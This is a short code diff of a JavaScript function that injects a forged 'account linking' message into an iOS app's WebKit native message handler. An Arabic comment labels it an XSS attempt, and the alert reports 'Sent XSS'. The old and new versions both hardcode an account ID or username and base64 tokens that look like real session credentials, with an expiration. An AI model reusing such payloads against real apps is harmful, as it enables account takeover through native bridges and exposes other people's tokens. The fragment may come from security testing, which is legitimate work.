@@ -40,11 +40,11 @@
     function sendTargetAccountLinking() {
       try {
         // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
-        window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-        accountId: "863776540939551628",
-        action: "linkAccount",
-        token: "MTQzMTU5NDoxMDU0NjE2NTc1MTQ5Mzc2MTAxOjkyMjMzNzIwMzY4NTQ3NzU4MDc6MXwxNzU0MTAyNzM0OjAtLTQyNDg3YzZjOTgwZTc4MDgzYTk2MDc0MTI5M2Q0ZmVm"
-        });
+      window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
+      username: "Taha hussein",
+      token: "MTQzMTU5NDoxMDU0NjE2NTc1MTQ5Mzc2MTAxOjkyMjMzNzIwMzY4NTQ3NzU4MDc6MXwxNzU0MTA3MjczOjAtLWI3ZmZhZmZhNDY1YTQ0ZmMxNGRkMGVhNGQxNTU2YzAy",
+      expiration: "1754110873"
+});
         alert("✅ Sent XSS ");
       } catch (e) {
         alert("❌ Error: " + e.message);
